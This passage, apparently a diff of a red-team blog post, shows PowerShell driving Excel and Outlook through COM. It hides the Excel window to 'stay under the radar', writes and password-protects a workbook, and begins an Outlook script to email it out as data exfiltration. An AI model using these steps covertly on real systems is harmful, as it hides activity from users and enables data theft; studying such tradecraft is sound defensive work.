@@ -133,12 +133,12 @@
 <p>Let&rsquo;s explore some scenarios and code examples in this blog post.</p>
 <h2 id="automating-microsoft-excel">Automating Microsoft Excel</h2>
 <p>For instance, it&rsquo;s quite simple to automate the popular <code>Excel</code> application via <code>PowerShell</code>. We can use the <code>New-Object -com</code> command to create the Excel Application, and subsequently interact with the returned object.</p>
-<pre><code>PS C:\&gt; $excel = New-Object -com Excel.Application
+<pre tabindex="0"><code>PS C:\&gt; $excel = New-Object -com Excel.Application
 PS C:\&gt; $excel.Visible = $true
 </code></pre><p>To stay under the radar and hide the user interface, use the default of <code>Visible = $false</code>.</p>
 <h3 id="editing-the-excel-document">Editing the Excel document</h3>
 <p>As the next step we can add a <code>Workbook</code> and write some data to a specific <code>Cell</code>.</p>
-<pre><code>PS C:\&gt; $workbook = $excel.Workbooks().Add()
+<pre tabindex="0"><code>PS C:\&gt; $workbook = $excel.Workbooks().Add()
 PS C:\&gt; $cell = $workbook.ActiveSheet.Cells(1,1)
 PS C:\&gt; $cell.Value = &quot;Here goes the secret message!&quot;
 PS C:\&gt; $workbook.Password = &quot;Test&quot;
@@ -147,15 +147,15 @@ PS C:\&gt; $workbook.Password = &quot;Test&quot;
 <p>The above images shows the created Excel document. <em>Remember that we set <code>Visible=$true</code> - this to demo what is possible, during an attack an adversary would not show the user interface.</em></p>
 <h3 id="saving-the-document">Saving the document</h3>
 <p>Using the <code>SaveAs</code> function the document can be stored.</p>
-<pre><code>PS C:\&gt; $workbook.SaveAs(&quot;EmbraceTheRed&quot;)
+<pre tabindex="0"><code>PS C:\&gt; $workbook.SaveAs(&quot;EmbraceTheRed&quot;)
 </code></pre><h3 id="closing-the-document">Closing the document</h3>
 <p>Finally, Excel can be closed.</p>
-<pre><code>PS C:\&gt; $workbook.Close()
+<pre tabindex="0"><code>PS C:\&gt; $workbook.Close()
 PS C:\&gt; $excel.Quit()
 </code></pre><h3 id="data-exfiltration---emailing-the-document">Data Exfiltration - Emailing the document</h3>
 <p>As said all most of Office is implemented using COM interfaces, so we can automate <code>Outlook</code> as well.</p>
 <p>In order to send the created <code>Excel</code> document out of the network, an adversary could use <code>Outlook</code> for instance.</p>
-<pre><code>$to = &quot;&quot;
+<pre tabindex="0"><code>$to = &quot;&quot;
 $subject = &quot;Secret Excel Document&quot;
 $content = &quot;Important message attached.&quot;
 
